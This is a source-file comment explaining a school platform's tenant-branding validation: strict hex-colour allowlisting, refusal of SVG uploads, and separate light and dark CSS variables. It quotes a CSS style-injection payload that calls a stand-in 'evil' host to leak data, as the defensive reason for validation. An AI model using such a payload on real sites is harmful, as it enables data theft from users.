/**
 * Tenant branding — the one definition of what a school's identity is.
 *
 * R-1 of docs/11-MASTER-PLAN.md. The product is one codebase serving many
 * institutions, and an institution must never see another's identity — or
 * the platform's — on its own screens or its own printed paper.
 *
 * ── Why this lives in ui-core ────────────────────────────────────────────
 * Both sides need the same rules. The browser wants them for instant
 * feedback in the branding editor; the server needs them because the
 * browser's copy is advice, not enforcement. Two implementations of one
 * schema drift, and the direction they drift is always "the server accepts
 * something the editor would have refused". So there is one module, it has
 * zero dependencies and touches no DOM and no node API, and both import it.
 *
 * The server remains the authority: services/ops-svc/api/branding.ts
 * re-validates every write with parseBranding() before it reaches the
 * database, regardless of what the client believed.
 *
 * ── Why colours are validated so strictly ───────────────────────────────
 * primaryColor lands in a CSS custom property. An unvalidated string there
 * is a style-injection vector — `red; background: url(//evil/?c=` closes
 * the declaration and opens another. HEX_RE is an allowlist, not a
 * sanitiser, and normaliseColor() throws rather than repairing anything it
 * does not recognise.
 *
 * ── Why SVG is refused for uploaded assets ──────────────────────────────
 * An SVG is a document, not an image: it can carry <script>, and a school
 * IT account is not a trust boundary we want to bet an XSS on. Raster only.

 * CSS custom properties that repaint the app in a tenant's colours.

 * apps/pwa/public/app.css writes every rule against the SEMANTIC aliases
 * (--c-primary and friends), not against the raw palette, precisely so the
 * palette can be re-pointed in one place. That is the seam this uses. The
 * older --color-primary names are emitted too, because the design-system
 * stylesheet under public/design/ still reads them.
 *
 * --c-accent is deliberately NOT emitted. In this stylesheet it means
 * "destructive / error", and repainting it with a school's brand colour
 * would make every delete confirmation look like a primary action.
 * Likewise the status colours: a school may choose its brand, not what
 * "absent" or "overdue" look like.
 *
 * ── Why light and dark are separate ─────────────────────────────────────
 * The dark block in app.css re-points --c-primary-text, --c-primary-ink,
 * --c-link and --c-primary-soft at LIGHTER steps of the accent ramp,
 * because text that clears 4.5:1 on a white ground fails badly on a
 * near-black one. A single set of overrides would either be overridden by
 * that block (higher specificity) or would win and drag unreadable dark
 * text into dark mode. So both are derived, each from the same brand hue.
 *
 * Returned as data rather than written here so the caller decides where it
 * lands, and so this stays testable with no DOM.
